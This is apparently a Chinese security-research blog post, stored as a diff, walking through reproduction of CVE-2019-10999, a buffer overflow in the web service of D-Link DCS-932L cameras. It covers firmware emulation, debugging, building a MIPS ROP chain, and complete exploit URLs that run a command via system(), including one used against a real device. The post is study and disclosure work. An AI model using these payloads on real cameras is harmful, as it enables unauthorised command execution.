@@ -1,0 +1,100 @@
+## 前言
+记录在复现CVE-2019-10999时踩的坑。
+## 漏洞信息
+该漏洞存在于Dlink DCS-93xL、DCS-50xxL系列摄像头的所有固件版本中。  
+在设备的alphapd服务中，wireless.htm
+在将其显示给用户之前进行处理。如果在URL中提供WEPEncryption的值，它会把用户传入的值copy到定义的buf中，但没有进行长度判断，存在缓冲区溢出漏洞，攻击者可利用其来执行任意命令。
+## 漏洞复现
+拿到固件，解包（本文测试用固件为DCS-932L v1.14.04）。  
+IDA加载alphapd程序，定位到漏洞函数，可溢出buf和返回地址ra之间相差0x28个字节：
+为了把alphapd服务跑起来便于调试利用。而在模拟运行alphapd服务时，缺少NVRAM，无法获取其运行时的配置信息。  
+可以用nvram-faker构建一个库，使用LD_PRELOAD劫持对libnvram库中的函数调用，从而使用nvram-faker提供的ini配置文件。
+    git clone https://github.com/zcutlip/nvram-faker.git
+在原始固件中查找默认配置值：
+    grep -rin --color "SecondHTTPPortEnable"
+导入到nvram.ini文件：
+    cat etc_ro/Wireless/RT2860AP/RT2860_default_vlan > nvram.ini
+    cp nvram.ini ~/nvram-faker
+编译库文件：
+    ./buildmipsel.sh
+将编译好后的libnvram-faker.so和nvram.ini文件复制到固件根目录后, qemu模拟运行alphad服务，优先加载libnvram-faker.so库：
+    sudo chroot . ./qemu-mipsel-static -E LD_PRELOAD="./libnvram-faker.so"  /bin/alphapd
+会报错没有pid文件：
+在cpio-root/var/文件夹下创建/run/alphapd.pid文件就行。
+之后又报错说先启动nvram_daemon，在ida能看到调用了nvramd.pid文件，同理在/var/run下创建nvramd.pid文件就行。
+为了在更真实的环境下运行alphapd，我搭建了一个[debian mipsel环境](https://shadow-file.blogspot.com/2013/05/running-debian-mips-linux-in-qemu.html)，在其中模拟alphapd服务：
+    chroot . /bin/alphapd -E LD_PRELOAD=libnvram-faker.so
+能成功启动alphapd，但无法创建RSA密钥：
+openssl官网说是缺少urandom,random设备而导致的问题。自己创建这两个设备:
+    sudo chroot . /bin/mknod -m 0666 /dev/random c 1 8
+    sudo chroot . /bin/mknod -m 0666 /dev/urandom c 1 9
+无法写入'random state':
+没有设置RANDFILE和HOME环境变量。创建一个空的.rnd文件，并设置环境变量：
+    touch .rnd
+    export HOME=.
+    export RANDFILE=$HOME/.rnd
+获取不到ip地址：
+在IDA中定位到这一段：
+它是在getSysInfoLong中通过gpio设备接口来获取ip的…然而模拟环境并没有这个接口…
+没办法只好强行改，让它直接跳到下面：
+跳过之后会默认在0.0.0.0地址在运行：
+可成功访问网页：
+ok，来试试传入我们的payload。传入0x28个A，和0x4个B来尝试覆盖返回地址
+    http://0.0.0.0/wireless.htm?WEPEncryption=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+然而在1.14以上的高版本中，不能直接输入url进入页面，会返回403。只能从主页面点进去：
+那么要把WEPEncryption参数值传进去就不能直接输ulr了。  
+但我们可以通过在web开发者工具中更改Request来传：
+用gdbserver挂载到4444端口上：
+    gdbserver --attach 0.0.0.0:4444 1163
+记得在debian虚拟机的启动脚本中添加几个端口转发，方便本机加载调试：
+IDA加载调试，更改request传入我们的payload，可以看到成功覆盖到了ra:
+既然我们可以控制返回地址以及S0-S5的寄存器值了，那么就可以利用它们跳转到system来执行任意命令。  
+查看alphapd调用的lib库，可以获取其基址0x77ed3000：
+在libuClibc-0.9.28.so中找到system地址0x0004BD20：
+那么当其加载到内存中时的地址就是：0x0004BD20 + 0x77ed3000 = 0x77f1ed20
+接下来就需要找有用的rop gadget来获取栈地址，并跳转到system函数传入任意命令了。  
+用ida的[mipsrop](http://www.devttys0.com/2013/10/mips-rop-ida-plugin/)插件来找rop
+gadget：
+在使用mipsrop时，偶尔会出现out of range的情况：
+定位到其源码的393行，自己打个补丁，加了个不为空的判断：
+    for xref in idautils.XrefsTo(idc.LocByName('system')):
+                ea = xref.frm
+    -           if ea >= start_ea and ea = start_ea and ea  0 and idc.GetMnem(ea)[0] in ['j', 'b']:
+                    a0_ea = self._find_next_instruction_ea(ea+self.INSIZE, stack_arg_zero, ea+self.INSIZE)
+使用下面的这个rop gadget：
+    .text:00050DE4 addiu $s2, $sp, 0x1E8+var_F8
+    .text:00050DE8 move $a0, $s2
+    .text:00050DEC move $t9, $s0
+    .text:00050DF0 jalr $t9 ; sub_505D0
+获取栈地址存入s2，偏移为0x1e8 - 0xf8 =
+0xf0。将s0存入t9，然后跳转到t9指向的地址。也就是将system地址存入s0的话就能跳转到system函数了。
+最终的利用流程为：
+  * 返回地址ra覆盖为rop gadget地址（0x00050DE4 + 0x77ed3000 = 0x77f23de4）
+  * 跳转到我们构造的rop链中
+  * s0覆盖为system地址（0x77f1ed20）
+  * 跳转到system函数中，并传入我们构造的字符串命令
+构造url：
+    http://0.0.0.0:18080/wireless.htm?WEPEncryption=AAAAAAAAAAAAAAAA%20%ed%f1%77AAAAAAAAAAAAAAAAAAAA%e4%3d%f2%77AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBreboot
+为了验证结果，我们想看到lib库函数调用的结果就需要用到gdb调试。安装gdb的pwndbg插件（peda对mips的支持不行，装了之后也不会显示栈信息）：
+    git clone https://github.com/pwndbg/pwndbg
+    cd pwndbg
+    ./setup.sh
+安装时会报错：
+原因是unicorn不支持用python3编译…那就自己装吧：
+    UNICORN_QEMU_FLAGS="--python=/usr/bin/python2.7" pip install unicorn
+安装好unicorn后再运行下setup.sh就行了，虽然还会报那个错不用管。
+用gdb附加调试，在system函数断下：
+可以看到成功传入了参数'reboot'，执行成功：
+结果说到底还是搭环境坑啊orz……
+# 实机攻击测试
+闲鱼淘了个二手的dcs932L来玩，试试我们的payload能不能打进去。  
+经过测试发现，其最早的固件版本1.0里的开机脚本里居然开了telnetd服务，并且在其web.sh里发现它的web服务程序是goahead:
+这个goahead程序应该就是alphapd的原始版本了，在同样的位置也能找到这个漏洞：
+telnet连进去看看，可以找到goahead加载的库基址：
+拿到库基址，和之前一样构造ulr，可以成功执行我们传入的命令：
+    ?WEPEncryption=AAAAAAAAAAAAAAAA%20%ad%b3%2aAAAAAAAAAAAAAAAAAAAA%e4%fd%b3%2aBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBreboot
+但是在高版本的固件中就不会那么好心给你开telnet了，想要进shell找它的库基址也没这么简单了（虽然我测过之后才发现它们所有固件版本的web服务加载库基址都是一样的=
+=）  
+拆开找到四个超小的串口焊点，拿几根比较细的铜丝焊上，连接TTL进行调试：
+打开串口调试工具，选择合适串口和波特率，就可以进入shell找它加载的库基址了：
+构造url，可成功传入命令：
